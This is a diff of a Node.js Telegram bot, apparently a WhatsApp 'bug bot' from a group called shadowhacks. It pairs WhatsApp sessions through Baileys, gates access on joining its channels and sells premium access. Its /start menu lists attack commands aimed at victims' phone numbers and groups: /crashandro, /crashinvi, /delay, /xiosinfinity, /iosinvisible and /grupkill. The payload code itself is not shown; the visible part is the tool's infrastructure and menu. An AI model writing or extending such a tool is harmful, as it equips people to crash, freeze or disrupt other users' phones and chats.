@@ -5,7 +5,7 @@ process.on('uncaughtException', (err) => {
 process.on('unhandledRejection', (reason) => {
     console.error('UNHANDLED REJECTION:', reason);
 });
-// ⏳ Runtime calculator
+// Runtime calculator
 function runtime(seconds) {
   seconds = Number(seconds);
   const d = Math.floor(seconds / (3600 * 24));
@@ -20,7 +20,7 @@ function runtime(seconds) {
   );
 }
 
-// ──────────────── Imports ────────────────
+// Imports
 const TelegramBot = require('node-telegram-bot-api');
 const {
   makeWASocket,
@@ -30,12 +30,9 @@ const {
   prepareWAMessageMedia,
   proto,
   fetchLatestBaileysVersion,
-
-  // ✅ ADD THESE ONLY
   jidDecode,
   encodeWAMessage,
   encodeSignedDeviceIdentity
-
 } = require('@whiskeysockets/baileys');
 
 const fs = require('fs-extra');
@@ -53,7 +50,7 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 const SESSIONS_DIR = './sessions';
 const SESSIONS_FILE = './sessions/active_sessions.json';
-const PAIR_FILE = './user_pairs.json'; // updated file name
+const PAIR_FILE = './user_pairs.json';
 const PREMIUM_FILE = './premium_users.json';
 
 const sessions = new Map();
@@ -66,45 +63,31 @@ let premiumUsers = [];
 let pairedUsers = [];
 let userPairs = [];
 
-
 function cleanupExpiredPremiums() {
   const now = Date.now();
   const before = premiumUsers.length;
-
   premiumUsers = premiumUsers.filter(u => u.expiresAt > now);
-
   if (premiumUsers.length !== before) {
     savePremiumUsers();
-    console.log(chalk.yellow('🧹 Expired premium users cleaned'));
+    console.log(chalk.yellow('Expired premium users cleaned'));
   }
 }
 
-// Run every 60 seconds
 setInterval(cleanupExpiredPremiums, 60 * 1000);
-
-// Run once on startup
 cleanupExpiredPremiums();
 
-//auto add premium 
 function addAutoPremium(userId, durationHours = 24) {
   const now = Date.now();
   const expiresAt = now + durationHours * 60 * 60 * 1000;
-
   const exists = premiumUsers.find(u => u.id === userId.toString());
-
   if (exists) {
-    // Extend premium
     exists.expiresAt = expiresAt;
   } else {
-    premiumUsers.push({
-      id: userId.toString(),
-      expiresAt
-    });
+    premiumUsers.push({ id: userId.toString(), expiresAt });
   }
-
   savePremiumUsers();
 }
-// ──────────────── Load & Save ────────────────
+
 function loadPremiumUsers() {
   try {
     if (fs.existsSync(PREMIUM_FILE)) {
@@ -140,13 +123,11 @@ function savePairedUsers() {
 
 function isPremium(userId) {
   const now = Date.now();
-  return premiumUsers.some(
-    u => u.id === userId.toString() && u.expiresAt > now
-  );
+  return premiumUsers.some(u => u.id === userId.toString() && u.expiresAt > now);
 }
+
 function isPaired(userId) { return pairedUsers.includes(userId.toString()); }
 
-// ──────────────── Active Sessions ────────────────
 function saveActiveSessions(botNumber) {
   try {
     const sessionsList = fs.existsSync(SESSIONS_FILE) ? JSON.parse(fs.readFileSync(SESSIONS_FILE)) : [];
@@ -165,27 +146,21 @@ function removeBrokenSession(botNumber) {
   try {
     const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
     if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
-    console.log(chalk.redBright(`🗑️ Deleted session folder for ${botNumber}`));
-
+    console.log(chalk.redBright(`Deleted session folder for ${botNumber}`));
     if (fs.existsSync(SESSIONS_FILE)) {
       const list = JSON.parse(fs.readFileSync(SESSIONS_FILE));
       const updated = list.filter(num => num !== botNumber);
       fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updated, null, 2));
-      console.log(chalk.yellow(`⚠️ Removed ${botNumber} from active_sessions.json`));
+      console.log(chalk.yellow(`Removed ${botNumber} from active_sessions.json`));
     }
-
-    // Remove from paired users & userPairs
     pairedUsers = pairedUsers.filter(num => num !== botNumber);
     userPairs = userPairs.filter(pair => pair.whatsappNumber !== botNumber);
     savePairedUsers();
-
-  } catch (err) { console.error(chalk.red(`❌ Error deleting broken session for ${botNumber}:`), err); }
+  } catch (err) { console.error(chalk.red(`Error deleting broken session for ${botNumber}:`), err); }
 }
 
-// ──────────────── User Pair JSON Helpers ────────────────
 const USER_PAIRS_FILE = './user_pairs.json';
 
-// Load paired users on startup
 function loadUserPairs() {
   try {
     if (fs.existsSync(USER_PAIRS_FILE)) {
@@ -196,7 +171,6 @@ function loadUserPairs() {
   }
 }
 
-// Save paired users
 function saveUserPairs() {
   try {
     fs.writeFileSync(USER_PAIRS_FILE, JSON.stringify(userPairs, null, 2));
@@ -205,13 +179,11 @@ function saveUserPairs() {
   }
 }
 
-// Get paired number for a Telegram user
 function getPairedNumber(telegramId) {
   const entry = userPairs.find(u => u.telegramId === telegramId);
   return entry ? entry.whatsappNumber : null;
 }
 
-// Add or update a pairing
 function setUserPair(telegramId, whatsappNumber) {
   const index = userPairs.findIndex(u => u.telegramId === telegramId);
   if (index !== -1) {
@@ -222,28 +194,22 @@ function setUserPair(telegramId, whatsappNumber) {
   saveUserPairs();
 }
 
-// Remove a pairing
 function removeUserPair(telegramId) {
   userPairs = userPairs.filter(u => u.telegramId !== telegramId);
   saveUserPairs();
 }
 
-
-
-// ──────────────── WhatsApp Connections ────────────────
 async function initializeWhatsAppConnections() {
   try {
     if (!fs.existsSync(SESSIONS_FILE)) return;
     const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
     console.log(chalk.yellow(`Found ${activeNumbers.length} active WhatsApp sessions`));
-
     for (const botNumber of activeNumbers) {
       console.log(chalk.blue(`Attempting to connect WhatsApp: ${botNumber}`));
       const sessionDir = createSessionDir(botNumber);
       const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
       const { version: latestVersion } = await fetchLatestBaileysVersion();
-    const version = latestVersion;
-
+      const version = latestVersion;
       Gyzen = makeWASocket({
         auth: state,
         printQRInTerminal: true,
@@ -253,13 +219,11 @@ async function initializeWhatsAppConnections() {
         markOnlineOnConnect: false,
         defaultQueryTimeoutMs: undefined,
       });
-
       sock = Gyzen;
-
       Gyzen.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect } = update;
         if (connection === 'open') {
-          console.log(chalk.green(`Bot ${botNumber} Connected 🔥!`));
+          console.log(chalk.green(`Bot ${botNumber} Connected!`));
           sessions.set(botNumber, Gyzen);
           if (!pairedUsers.includes(botNumber)) {
             pairedUsers.push(botNumber);
@@ -267,42 +231,36 @@ async function initializeWhatsAppConnections() {
           }
         } else if (connection === 'close') {
           const statusCode = lastDisconnect?.error?.output?.statusCode || 0;
-          console.log(chalk.red(`⚠️ Connection closed for ${botNumber} [${statusCode}]`));
+          console.log(chalk.red(`Connection closed for ${botNumber} [${statusCode}]`));
           if (statusCode === DisconnectReason.loggedOut || statusCode === DisconnectReason.connectionClosed || statusCode === 403 || !Gyzen.ws || Gyzen.ws.readyState !== 1) {
-            console.log(chalk.redBright(`💀 ${botNumber} appears banned or invalid — cleaning up...`));
+            console.log(chalk.redBright(`${botNumber} appears banned or invalid — cleaning up...`));
             removeBrokenSession(botNumber);
             return;
           }
-          console.log(chalk.yellow(`⚠️ Temporary network issue for ${botNumber}, reconnecting...`));
+          console.log(chalk.yellow(`Temporary network issue for ${botNumber}, reconnecting...`));
           await sleep(4000);
           await initializeWhatsAppConnections();
         } else if (connection === 'open' && (!Gyzen.ws || Gyzen.ws.readyState !== 1)) {
-          console.log(chalk.redBright(`🚫 Fake connected state detected for ${botNumber}`));
+          console.log(chalk.redBright(`Fake connected state detected for ${botNumber}`));
           removeBrokenSession(botNumber);
         }
       });
-
       Gyzen.ev.on('creds.update', saveCreds);
     }
   } catch (error) { console.error(chalk.red('Error initializing WhatsApp connections:'), error); }
 }
 
-// ──────────────── Connect to WhatsApp ────────────────
 async function connectToWhatsApp(botNumber, chatId) {
   try {
-    let statusMessage = await bot.sendMessage(chatId, `⏳ PROCESSING PAIRING ${botNumber}...`).then((msg) => msg.message_id);
+    let statusMessage = await bot.sendMessage(chatId, `PROCESSING PAIRING ${botNumber}...`).then((msg) => msg.message_id);
     const sessionDir = createSessionDir(botNumber);
-
-    // Clean old session if exists
     if (fs.existsSync(sessionDir)) {
       fs.rmSync(sessionDir, { recursive: true, force: true });
-      console.log(chalk.yellow(`🧹 Cleaned old session for ${botNumber}`));
+      console.log(chalk.yellow(`Cleaned old session for ${botNumber}`));
     }
-
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
     const { version, isLatest } = await fetchLatestBaileysVersion();
     console.log(chalk.blue(`Using WA v${version.join('.')}, isLatest: ${isLatest}`));
-
     Gyzen = makeWASocket({
       auth: state,
       printQRInTerminal: false,
@@ -313,11 +271,9 @@ async function connectToWhatsApp(botNumber, chatId) {
       defaultQueryTimeoutMs: undefined,
     });
     sock = Gyzen;
-
     return new Promise((resolve, reject) => {
       Gyzen.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect } = update;
-
         if (connection === 'connecting') {
           await sleep(2000);
           try {
@@ -325,59 +281,50 @@ async function connectToWhatsApp(botNumber, chatId) {
               const code = await Gyzen.requestPairingCode(botNumber);
               const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
               await bot.editMessageText(
-                `✅ *PAIRING CODE:* \`${formattedCode}\`
-
-Enter this in WhatsApp > Settings > Linked Devices > Link with phone number`,
-                { chat_id: chatId, message_id: statusMessage, parse_mode: 'Markdown' }
+                `SUCCESS PAIRING\nCODE: ${formattedCode}`,
+                { chat_id: chatId, message_id: statusMessage }
               );
             }
           } catch (err) {
             console.error('Pairing code error:', err);
-            await bot.editMessageText(`❌ FAILED TO GET PAIRING CODE: ${err.message}`, { chat_id: chatId, message_id: statusMessage });
+            await bot.editMessageText(`FAILED ${botNumber}: ${err.message}`, { chat_id: chatId, message_id: statusMessage });
             reject(err);
           }
         }
-
         else if (connection === 'open') {
           sessions.set(botNumber, Gyzen);
           saveActiveSessions(botNumber);
           if (!pairedUsers.includes(botNumber)) { pairedUsers.push(botNumber); savePairedUsers(); }
-          await bot.editMessageText(`✅ *PAIRING SUCCESS* ${botNumber}`, { chat_id: chatId, message_id: statusMessage, parse_mode: 'Markdown' });
+          await bot.editMessageText(`Pairing Success ${botNumber}`, { chat_id: chatId, message_id: statusMessage });
           resolve(Gyzen);
         }
-
         else if (connection === 'close') {
           const statusCode = lastDisconnect?.error?.output?.statusCode;
           if (statusCode && statusCode >= 500 && statusCode < 600) {
-            await bot.editMessageText(`⏳ RECONNECTING ${botNumber}...`, { chat_id: chatId, message_id: statusMessage });
+            await bot.editMessageText(`RECONNECTING ${botNumber}...`, { chat_id: chatId, message_id: statusMessage });
             await sleep(4000);
             resolve(await connectToWhatsApp(botNumber, chatId));
           } else {
-            await bot.editMessageText(`❌ ERROR ${botNumber} [Code: ${statusCode}]`, { chat_id: chatId, message_id: statusMessage });
+            await bot.editMessageText(`ERROR ${botNumber} [Code: ${statusCode}]`, { chat_id: chatId, message_id: statusMessage });
             try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch {}
             reject(new Error(`Connection closed: ${statusCode}`));
           }
         }
       });
-
       Gyzen.ev.on('creds.update', saveCreds);
     });
-
   } catch (error) {
     console.error('Error in connectToWhatsApp:', error);
-    await bot.sendMessage(chatId, '❌ Error connecting to WhatsApp.');
+    await bot.sendMessage(chatId, 'Error connecting to WhatsApp.');
     throw error;
   }
 }
 
-// Bot Start
-// CONFIG — update apne links aur channel username
-const CHANNEL_USERNAME = "@shadowhacks"; // Telegram channel
+const CHANNEL_USERNAME = "@shadowhacks";
 const YT_LINK = "http://www.youtube.com/@Teamshadowhacker";
 const IG_LINK = "https://www.instagram.com/shadowofficial?igsh=MXBuZnU0bGVma3UwMQ==";
 const WA_LINK = "https://whatsapp.com/channel/0029VbBo79xA89MqhJETWp0Z";
 
-// Join check helper
 async function isUserJoined(bot, userId) {
   try {
     const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
@@ -387,84 +334,73 @@ async function isUserJoined(bot, userId) {
   }
 }
 
-// AUTO  Mera FUNCTION
 bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const joined = await isUserJoined(bot, userId);
-
-  // ❌ NOT JOINED
   if (!joined) {
     return bot.sendMessage(
       chatId,
-      "<b>❌ Access Denied</b>Please join our channel first to use the bot 👇",
+      "<b>Access Denied</b>\n\nPlease join our channel first to use the bot",
       {
-        parse_mode: "HTML", // Markdown se HTML kar diya
+        parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
-            [{ text: "📢 Join Telegram Channel", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` }],
+            [{ text: "Join Telegram Channel", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` }],
             [
-              { text: "▶️ YouTube", url: YT_LINK },
-              { text: "📸 Instagram", url: IG_LINK }
+              { text: "YouTube", url: YT_LINK },
+              { text: "Instagram", url: IG_LINK }
             ],
-            [{ text: "💬 WhatsApp", url: WA_LINK }],
-            [{ text: "✅ Check Again", callback_data: "check_join" }]
+            [{ text: "WhatsApp", url: WA_LINK }],
+            [{ text: "Check Again", callback_data: "check_join" }]
           ]
         }
       }
     );
   }
-
-  // ✅ JOINED → AUTO PREMIUM 999 HOURS
-
-
   const uptime = runtime(process.uptime());
-
-  // HTML use karne se underscores (@shadow_official) error nahi denge
   const introMessage = `
-┌───[  ⚜️ 𝙎𝙔𝙀𝘿 𝘽𝙐𝙂 𝘽𝙊𝙏 ⚜️  ]───┐
-│ 𝐃𝐞𝐯: @shadow_official
-│ 𝐔𝐩𝐭: ${uptime}
-├──────────────────────┤
-│ 🤖 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐙𝐎𝐍𝐄
-│ • /crashinvi 92xxx
-│ • /crashandro num hours
-│ • /delay 92xxx
-│ • /delay1 92xxx
-│ • /delay2 92xxx
-│ • /delay3 num hours
-├──────────────────────┤
-│ 🍎 𝐢𝐎𝐒 𝐙𝐎𝐍𝐄
-│ • /xiosinfinity num hours
-│ • /iosinvisible 92xxx
-├──────────────────────┤
-│ 👥 𝐆𝐑𝐎𝐔𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
-│ • /getjid
-│ • /grupkill
-├──────────────────────┤
-│ 👑 𝗨𝗦𝗘𝗥𝗦 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
-│ • /reqpair
-│ • /delpair
-│
-│    𝒔𝒚𝒆𝒅_𝒉𝒂𝒄𝒌𝒆𝒓_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍
-└──────────────────────┘
-`;
+SHADOW OFFICIAL BOT
+Dev: @shadow_official
+Upt: ${uptime}
 
+ANDROID ZONE
+- /crashinvi 92xxx
+- /crashandro num hours
+- /delay 92xxx
+- /delay1 92xxx
+- /delay2 92xxx
+- /delay3 num hours
+
+iOS ZONE
+- /xiosinfinity num hours
+- /iosinvisible 92xxx
+
+GROUP COMMANDS
+- /getjid
+- /grupkill
+
+USERS COMMANDS
+- /reqpair
+- /delpair
+
+shadow_official
+`;
   await bot.sendPhoto(
     chatId,
     "https://files.catbox.moe/z2l1as.jpg",
     {
       caption: introMessage,
-      parse_mode: "HTML", // Yahan bhi HTML kar diya taaki error na aaye
+      parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "📢 Telegram", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` },
-            { text: "▶️ YouTube", url: YT_LINK }
+            { text: "Telegram", url: `https://t.me/${CHANNEL_USERNAME.replace("@","")}` },
+            { text: "YouTube", url: YT_LINK }
           ],
           [
-            { text: "📸 Instagram", url: IG_LINK },
-            { text: "💬 WhatsApp", url: WA_LINK }
+            { text: "Instagram", url: IG_LINK },
+            { text: "WhatsApp", url: WA_LINK }
           ]
         ]
       }
@@ -472,1638 +408,629 @@ bot.onText(/\/start/, async (msg) => {
   );
 });
 
-// CHECK AGAIN BUTTON
 bot.on("callback_query", async (q) => {
   if (q.data !== "check_join") return;
-
   const joined = await isUserJoined(bot, q.from.id);
-
   if (joined) {
-    bot.answerCallbackQuery(q.id, { text: "✅ Verified! Send /start again" });
+    bot.answerCallbackQuery(q.id, { text: "Verified! Send /start again" });
   } else {
-    bot.answerCallbackQuery(q.id, { text: "❌ Still not joined", show_alert: true });
+    bot.answerCallbackQuery(q.id, { text: "Still not joined", show_alert: true });
   }
 });
 
-// Load users on startup
 loadPremiumUsers();
 loadPairedUsers();
 loadUserPairs();
 
-
-
-
-// ──────────────── Helper to check Main Owner ────────────────
 function isMainOwner(userId) {
   return userId === OWNER_ID.toString();
 }
 
-//Broadcast 
-const USERS_FILE = './users.json'; // users.json path
-
-// Load users from file
+const USERS_FILE = './users.json';
 let users = [];
 function loadUsers() {
   try {
     if (fs.existsSync(USERS_FILE)) {
-      users = JSON.parse(fs.readFileSync(USERS_FILE)); // array of IDs
-      console.log(`📥 Loaded ${users.length} users from users.json`);
+      users = JSON.parse(fs.readFileSync(USERS_FILE));
+      console.log(`Loaded ${users.length} users from users.json`);
     }
   } catch (err) {
-    console.error("❌ Error loading users:", err);
+    console.error("Error loading users:", err);
     users = [];
   }
 }
-
-// Call on startup
 loadUsers();
 
-// Owner-only broadcast command
-const ADMIN_ID = "8488081516"; // Only this admin can broadcast
+const ADMIN_ID = "8488081516";
 
 bot.onText(/\/broadcast/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
-
   if (userId !== ADMIN_ID) {
-    return bot.sendMessage(chatId, "❌ Only the ADMIN can use this command!");
+    return bot.sendMessage(chatId, "Only the ADMIN can use this command!");
   }
-
-  await bot.sendMessage(chatId, "📤 Send me the message you want to broadcast:");
-
-  // Safe listener that only triggers for the admin
+  await bot.sendMessage(chatId, "Send me the message you want to broadcast:");
   const textListener = async (replyMsg) => {
-    if (replyMsg.from.id.toString() !== ADMIN_ID) return; // Ignore everyone else
-
-    bot.removeListener("message", textListener); // Remove listener after one message
-
+    if (replyMsg.from.id.toString() !== ADMIN_ID) return;
+    bot.removeListener("message", textListener);
     const broadcastText = replyMsg.text || "";
-
     let sentCount = 0;
     for (const telegramId of users) {
       try {
         await bot.sendMessage(telegramId, broadcastText);
         sentCount++;
       } catch (e) {
-        console.error(`❌ Error sending to ${telegramId}:`, e.message);
+        console.error(`Error sending to ${telegramId}:`, e.message);
       }
     }
-
-    bot.sendMessage(chatId, `✅ Broadcast sent to ${sentCount} users!`);
+    bot.sendMessage(chatId, `Broadcast sent to ${sentCount} users!`);
   };
-
   bot.on("message", textListener);
 });
-//End Broadcast 
-// ──────────────── /listprem ────────────────
+
 bot.onText(/\/listprem$/, async (msg) => {
   const chatId = msg.chat.id;
   const sender = msg.from.id.toString();
-
-  // ─── ONLY MAIN OWNER ───
   if (!isMainOwner(sender)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ *Only Developer SHADOW OFFICIAL  can use this command!*",
-      { parse_mode: "Markdown" }
-    );
+    return bot.sendMessage(chatId, "Only Developer SHADOW OFFICIAL can use this command!", { parse_mode: "Markdown" });
   }
-
-  // ─── NO PREMIUM USERS ───
   if (!premiumUsers || premiumUsers.length === 0) {
-    return bot.sendMessage(
-      chatId,
-      `╔══════════════════════╗
-║   🚀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒   ║
-╠══════════════════════╣
-║ ⚠️ No premium users found
-╚══════════════════════╝
-      `.trim(),
-      { parse_mode: "Markdown" }
-    );
+    return bot.sendMessage(chatId, "No premium users found", { parse_mode: "Markdown" });
   }
-
   const now = Date.now();
-
-  // ─── BUILD LIST ───
   let list = premiumUsers
     .filter(u => u.expiresAt > now)
     .map((u, i) => {
       const remainingSeconds = Math.floor((u.expiresAt - now) / 1000);
-      return `│ ${i + 1}. \`${u.id}\` → *${runtime(remainingSeconds)} remaining*`;
+      return `${i + 1}. ${u.id} -> ${runtime(remainingSeconds)} remaining`;
     })
-    .join("
-");
-
-  // ─── SEND RESULT ───
-  return bot.sendMessage(
-    chatId,
-    `
-╔══════════════════════╗
-║   🚀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒   ║
-╠══════════════════════╣
-║ ${list}
-╚══════════════════════╝
-    `.trim(),
-    { parse_mode: "Markdown" }
-  );
+    .join("\n");
+  return bot.sendMessage(chatId, `PREMIUM USERS\n\n${list}`, { parse_mode: "Markdown" });
 });
 
-
-// ──────────────── Delete Bot Number Command (NO RESTART) ────────────────
 bot.onText(/\/delpair(?:\s*(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const telegramId = msg.from.id.toString();
     const rawNumber = match[1] ? match[1].trim() : null;
-
-    const SESSIONS_FILE = './sessions/active_sessions.json';
-    const PAIR_FILE = './user_pairs.json';
-
     const bannerImage = "https://files.catbox.moe/z2l1as.jpg";
-
     const sendWithBanner = async (text) => {
-        await bot.sendPhoto(chatId, bannerImage, {
-            caption: text,
-            parse_mode: "Markdown"
-        });
+        await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: "Markdown" });
     };
-
-    // Premium check
     if (!isPremium(telegramId)) {
-        return sendWithBanner(
-`╔══════❖ Delete Bot ❖══════╗
-║ Command: /delpair
-╚═════════════════════════╝`
-        );
+        return sendWithBanner("Delete Bot Command: /delpair");
     }
-
-    // No number provided
     if (!rawNumber) {
-        return sendWithBanner(
-`╔═══❖ Delete Bot ❖═══╗
-║ ⚠️ Provide number in
-║    International format
-║    /delpair 92xxxxxxx
-╚════════════════════╝`
-        );
+        return sendWithBanner("Provide number in International format: /delpair 92xxxxxxx");
     }
-
-    // Normalize number
     const botNumber = rawNumber.replace(/\D/g, "");
-
     if (!botNumber || botNumber.length < 10) {
-        return sendWithBanner(
-`╔═══❖ Wrong Format! ❖═══╗
-║ ⚠️ Enter a valid number
-║    Example: /delpair 92xxxxxxx
-╚═══════════════════════╝`
-        );
+        return sendWithBanner("Enter a valid number. Example: /delpair 92xxxxxxx");
     }
-
-    // Load JSONs safely
     let activeSessions = {};
     let userPairs = [];
-
-    try {
-        activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-    } catch {
-        activeSessions = {};
-    }
-
-    try {
-        userPairs = JSON.parse(fs.readFileSync(PAIR_FILE));
-    } catch {
-        userPairs = [];
-    }
-
-    // Check if number exists anywhere
+    try { activeSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE)); } catch { activeSessions = {}; }
+    try { userPairs = JSON.parse(fs.readFileSync(PAIR_FILE)); } catch { userPairs = []; }
     const existsInSessions = activeSessions[botNumber];
     const existsInPairs = userPairs.find(u => u.whatsappNumber === botNumber);
-
     if (!existsInSessions && !existsInPairs) {
-        return sendWithBanner(
-`╔═══❖ Not Found ❖═══╗
-║ ⚠️ Number ${botNumber}
-║    is not paired or active
-╚════════════════════╝`
-        );
+        return sendWithBanner(`Number ${botNumber} is not paired or active`);
     }
-
-    // Delete from active sessions
     if (existsInSessions) {
         delete activeSessions[botNumber];
         fs.writeFileSync(SESSIONS_FILE, JSON.stringify(activeSessions, null, 2));
     }
-
-    // Delete from user pairs
     if (existsInPairs) {
         userPairs = userPairs.filter(u => u.whatsappNumber !== botNumber);
         fs.writeFileSync(PAIR_FILE, JSON.stringify(userPairs, null, 2));
     }
-
-    // SUCCESS (NO RESTART)
-    return sendWithBanner(
-`╭─❖ Deleted Successfully ❖─╮
-│ ✔ ${botNumber}
-│   Removed from system
-╰─────────────────────────╯`
-    );
+    const sessionDir = `./sessions/device${botNumber}`;
+    if (fs.existsSync(sessionDir)) {
+        fs.rmSync(sessionDir, { recursive: true, force: true });
+    }
+    pairedUsers = pairedUsers.filter(n => n !== botNumber);
+    savePairedUsers();
+    return sendWithBanner(`Deleted Successfully: ${botNumber} Removed from system`);
 });
 
-
-
-
-//Restart Handler
 bot.onText(/\/restart/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id.toString();
-
-  // 1️⃣ Premium check
   if (!isPremium(userId)) {
-    return bot.sendMessage(chatId, "🚫You are not a premium user. Please contact the owner to buy premium access. @shadow_official to use /restart command!");
+    return bot.sendMessage(chatId, "You are not a premium user. Please contact the owner to buy premium access. @shadow_official to use /restart command!");
   }
-
-  // 2️⃣ Check if user has paired number
   const userPaired = userPairs.filter(u => u.telegramId === userId);
-
   if (userPaired.length === 0) {
-    return bot.sendMessage(chatId, "❌ You have not paired any number. Pair first using /reqpair");
+    return bot.sendMessage(chatId, "You have not paired any number. Pair first using /reqpair");
   }
-
-  await bot.sendMessage(chatId, "♻️ Checking sessions... please wait.");
-
-  // Load active sessions
+  await bot.sendMessage(chatId, "Checking sessions... please wait.");
   const sessionsFile = './sessions/active_sessions.json';
   let activeSessions = [];
-
   if (fs.existsSync(sessionsFile)) {
-    try {
-      activeSessions = JSON.parse(fs.readFileSync(sessionsFile));
-    } catch {
-      activeSessions = [];
-    }
+    try { activeSessions = JSON.parse(fs.readFileSync(sessionsFile)); } catch { activeSessions = []; }
   }
-
   let removed = 0;
   const updatedActive = [];
-
   for (const num of activeSessions) {
     const sessionDir = `./sessions/device${num}`;
     const creds = `${sessionDir}/creds.json`;
-
-    const valid =
-      fs.existsSync(sessionDir) &&
-      fs.existsSync(creds) &&
-      fs.readdirSync(sessionDir).length > 0;
-
-    // ❌ Ghost session → remove
+    const valid = fs.existsSync(sessionDir) && fs.existsSync(creds) && fs.readdirSync(sessionDir).length > 0;
     if (!valid) {
-      console.log(chalk.redBright(`🗑 Removing ghost session: ${num}`));
-
+      console.log(chalk.redBright(`Removing ghost session: ${num}`));
       try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch {}
-
       pairedUsers = pairedUsers.filter(n => n !== num);
       savePairedUsers();
-
       userPairs = userPairs.filter(u => u.whatsappNumber !== num);
       fs.writeFileSync('./user_pairs.json', JSON.stringify(userPairs, null, 2));
-
       removed++;
     } else {
       updatedActive.push(num);
     }
   }
-
-  // Save updated sessions if any
   if (updatedActive.length > 0) {
     fs.writeFileSync(sessionsFile, JSON.stringify(updatedActive, null, 2));
   } else {
-    if (fs.existsSync(sessionsFile)) {
-      fs.rmSync(sessionsFile, { force: true });
-    }
+    if (fs.existsSync(sessionsFile)) { fs.rmSync(sessionsFile, { force: true }); }
   }
-
-  // 3️⃣ CASE A — NO ghost sessions found → DO NOT RESTART
   if (removed === 0) {
-    return bot.sendMessage(
-      chatId,
-      "✅ All sessions are valid. No numbers found.\n✔ No restart needed."
-    );
+    return bot.sendMessage(chatId, "All sessions are valid. No numbers found. No restart needed.");
   }
-
-  // 4️⃣ CASE B — Cleanup happened → Restart safely
-  await bot.sendMessage(
-    chatId,
-    `🧹 Removed ${removed} invalid session(s).\n🔄 Restarting bot...`
-  );
-
+  await bot.sendMessage(chatId, `Removed ${removed} invalid session(s). Restarting bot...`);
   setTimeout(() => {
-    console.log(chalk.yellowBright("🔁 Restarting process after cleanup..."));
-    process.exit(0); // safe restart ONLY if cleanup happened
+    console.log(chalk.yellowBright("Restarting process after cleanup..."));
+    process.exit(0);
   }, 3000);
 });
 
-
-
-// ──────────────── Helper to check Main Owner ────────────────
 function isMainOwner(userId) {
   return userId === OWNER_ID.toString();
 }
 
-// ──────────────── Add Premium User (Days Based) ────────────────
 bot.onText(/\/addprem(?:\s+(\d+))?(?:\s+(\d+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = match[1];
   const days = match[2];
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
-    await bot.sendPhoto(chatId, bannerImage, {
-      caption: text,
-      parse_mode: 'Markdown'
-    });
+    await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: 'Markdown' });
   };
-
-  // 🔒 Only Main Owner
   if (!isMainOwner(msg.from.id.toString())) {
-    return sendWithBanner("🚫 Only Developer SHADOW OFFICIAL can use this command!");
+    return sendWithBanner("Only Developer SHADOW OFFICIAL can use this command!");
   }
-
   if (!userId || !days) {
-    return sendWithBanner(`
-┌─❖ *Add Premium (Days)* ❖┐
-│                         
-│  Usage:                
-│  /addprem <id> <days>  
-│                         
-│  Example:              
-│  /addprem 7373737 3    
-│                         
-└──────────────┬─────────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-`);
+    return sendWithBanner("Usage: /addprem <id> <days>\nExample: /addprem 7373737 3");
   }
-
   if (!/^\d+$/.test(userId) || !/^\d+$/.test(days)) {
-    return sendWithBanner(`
-┌─❖ *Invalid Input* ❖┐
-│                     
-│  ID & days must be  
-│  numeric values     
-│                     
-└──────────────┬─────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-`);
+    return sendWithBanner("ID & days must be numeric values");
   }
-
   const durationMs = Number(days) * 24 * 60 * 60 * 1000;
   const expiresAt = Date.now() + durationMs;
-
-  // Remove old entry if exists
   premiumUsers = premiumUsers.filter(u => u.id !== userId);
-
-  premiumUsers.push({
-    id: userId,
-    expiresAt
-  });
-
+  premiumUsers.push({ id: userId, expiresAt });
   savePremiumUsers();
-
-  return sendWithBanner(`
-┌─❖ *Premium Added* ❖┐
-│                    
-│  User ID: ${userId}
-│  Duration: ${days} day(s)
-│                    
-│  Expires in:
-│  ${runtime(durationMs / 1000)}
-│                    
-└──────────────┬─────┘
-                │
-*POWERED BY SHADOW OFFICIAL*
-`);
+  return sendWithBanner(`Premium Added\nUser ID: ${userId}\nDuration: ${days} day(s)\nExpires in: ${runtime(durationMs / 1000)}`);
 });
 
-
-// ──────────────── Delete Premium User Command ────────────────
 bot.onText(/\/delprem(?:\s*(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = match[1] ? match[1].trim() : null;
   const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';
-
   const sendWithBanner = async (text) => {
     await bot.sendPhoto(chatId, bannerImage, { caption: text, parse_mode: 'Markdown' });
   };
-
-  // 🔒 Only Main Owner
   if (!isMainOwner(msg.from.id.toString())) {
